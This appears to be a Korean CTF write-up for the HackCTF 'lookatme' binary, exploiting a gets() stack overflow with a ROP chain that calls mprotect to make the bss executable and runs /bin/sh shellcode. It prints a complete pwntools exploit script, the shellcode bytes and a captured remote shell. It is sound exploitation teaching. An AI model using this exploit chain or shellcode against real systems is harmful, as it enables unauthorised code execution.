# Look at me


```c
kimdong@ubuntu  ~/Wargame/200~250  file lookatme
lookatme: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.32, BuildID[sha1]=d2a1b10d006e4d6c4e84305383b4dc86481d87da, not stripped

kimdong@ubuntu  ~/Wargame/200~250  checksec lookatme
[*] '/home/kimdong/Wargame/200~250/lookatme'
   Arch:     i386-32-little
   RELRO:    Partial RELRO
   Stack:    No canary found
   NX:       NX enabled
   PIE:      No PIE (0x8048000)

```
이번 바이너리 파일은 32-bit로 NX-bit가 설정되어있으므로, Shellcode를 이용한 Exploit은 불가해 보인다.<br>

추가적으로, 이번 바이너리 파일은 `statically linked`이므로, ida로 보았을때, 내부에 많은 함수들이 존재한다.<br>

```c
kimdong@ubuntu  ~/Wargame/200~250  ./lookatme
Hellooooooooooooooooooooo
aaaaaaaaaaaa
```
실행시켜보면, 문자열이 출력되고, 사용자의 입력값을 받은뒤 종료되는 형식이다.<br>

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v3; // ST1C_4

  setvbuf(stdout, 0, 2, 0);
  v3 = getegid();
  setresgid(v3, v3, v3);
  look_at_me();
  return 0;
}
```
ida로 보면 main문은 다음과 같다.<br>

`egid`를 받아와서, gid를 설정하고 `look_at_me`함수를 실행시킨다.<br>

```c
int look_at_me()
{
  char v1; // [esp+0h] [ebp-18h]

  puts("Hellooooooooooooooooooooo");
  return gets(&v1);
}
```
`look_at_me`함수는 문자열을 출력해주고, gets를 통해 사용자의 입력값을 받는다.<br>

`gets`는 문자열 길이를 검증하지 않기때문에, `BOF`취약점을 사용할 수 있을것같다.<br>

v1의 버퍼의 크기는 0x18Byte이고, SFP까지 하면 총 28Byte의 dummy값을 주면 될것 같다.<br>

하지만, `NX-bit`가 설정되어있으므로, `shellcode`를 입력하는 방법외에, 덮어씌울 함수주소를 찾아봐야 할것 같다.<br>

아무리 찾아봐도 이전 문제들과 같은 flag를 띄워주거나 shell을 띄워주는 함수가 보이지않았다.<br>

아예 몰랐던 방법인데, `mprotect`라는 함수를 쓰면 가능하다고 한다.<br>

`mprotect()`함수를 이용하여 Shellcode가 저장된 메모리 영역의 권한을 RWX로 변경하는 방식이다.<br>

이때, 주소의 값은 page 경계에 맞게 정렬되야 하므로 page 크기 `4096(0x1000)`의 배수가 되어야한다.<br>

mprotect(권한을 줄 시작위치, 길이, 권한)을 순서대로 3개의 인자를 주어야 한다.<br>

따라서 고정주소값 영역에 shellcode를 저장하고 `mprotect()`를 통해 실행권한을 부여해서 쉘을 띄울수 있을것이다.<br>

이번 문제에는 `gadget`들이 필요한데, `Yes or no`문제에서 처럼 `ROP`기법을 사용해야 할것 같다.<br>

따라서 `gets()`함수를 통해 bss영역에 `shellcode`를 입력하기 위한 `pop * ret` 가젯을 구해보자.<br>

x86이므로, 레지스터는 상관이 없다.<br>

```c
kimdong@ubuntu  ~/Wargame/200~250  ./rp-lin-x86 -f lookatme -i 1 -r 1 |grep "pop edi ; ret"
0x08048480: pop edi ; ret  ;  (1 found)
```

`pr gadget`으로 `0x08048480`를 사용하도록 하겠다.<br>

이제, mprotect를 통해, shellcode가 입력된 주소지에 권한을 줄 `pop pop pop ret`가젯을 찾아보자.<br>

```c
kimdong@ubuntu  ~/Wargame/200~250  ./rp-lin-x86 -f lookatme -i 4 -r 4 |grep "pop ebx"
0x0806303b: pop edi ; pop esi ; pop ebx ; ret  ;  (1 found)
```
`pppr gadget`으로 `0x0806303b`를 사용하도록 하겠다.<br>

```c
kimdong@ubuntu  ~/Wargame/200~250  objdump -h lookatme |grep bss
16 .tbss         00000018  080e9f6c  080e9f6c  000a0f6c  2**2
24 .bss          00000e0c  080eaf80  080eaf80  000a1f80  2**5
```
`bss`의 시작위치를 찾기위해 objdump명령어를 사용하였다 두번째 `080eaf80`가 bss영역의 시작주소이다.<br>

`mprotect`함수를 사용하기 위해서는 4096의 배수가 되어야하는데, 위의 주소는 배수가 아니다.<br>

따라서, 4096의 배수가 되는 근접한 숫자를 주고 `mprotect()`의 범위로 조절하는 방법이 있다.<br>

`80EA000`을 시작주소로 잡도록 하겠다.<br>

문제 해결 순서는 아래와 같다.<br>

* 1) 위에서 구한 `pr gadget`을 통해 gets()함수를 이용하여 bss영역에 shellcode를 입력해준다.<br>
* 2) shellcode를 입력해주고, `pppr gadget`을 통해 `mprotect()`를 이용하여 해당 bss영역에 권한을 부여한다.<br>
* 3) ret주소를 shellcode가 입력된 bss영역으로 덮어씌운다.<br>

---

## Exploit Code

```c

from pwn import *
p = remote("ctf.j0n9hyun.xyz",3017)

e = ELF("./lookatme")

pr = 0x08048480
pppr = 0x0806303b
gets_addr = e.symbols["gets"]
mprotect_addr = e.symbols["mprotect"]
bss_start = 0x80EA000
bss = 0x080eaf80
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"

payload = "A"*28
payload += p32(gets_addr)
payload += p32(pr)
payload += p32(bss)

payload += p32(mprotect_addr)
payload += p32(pppr)
payload += p32(bss_start)
payload += p32(9000)
payload += p32(5)
payload += p32(bss)

p.recvuntil("Hellooooooooooooooooooooo\n")
p.sendline(payload)
p.sendline(shellcode)
p.interactive()
```

```c
kimdong@ubuntu  ~/Wargame/200~250  python lookatme_ex.py
[+] Opening connection to ctf.j0n9hyun.xyz on port 3017: Done
[*] '/home/kimdong/Wargame/200~250/lookatme'
   Arch:     i386-32-little
   RELRO:    Partial RELRO
   Stack:    No canary found
   NX:       NX enabled
   PIE:      No PIE (0x8048000)
[*] Switching to interactive mode
$ ls
flag
main
$ cat flag
HackCTF{}
$  
```

## END !
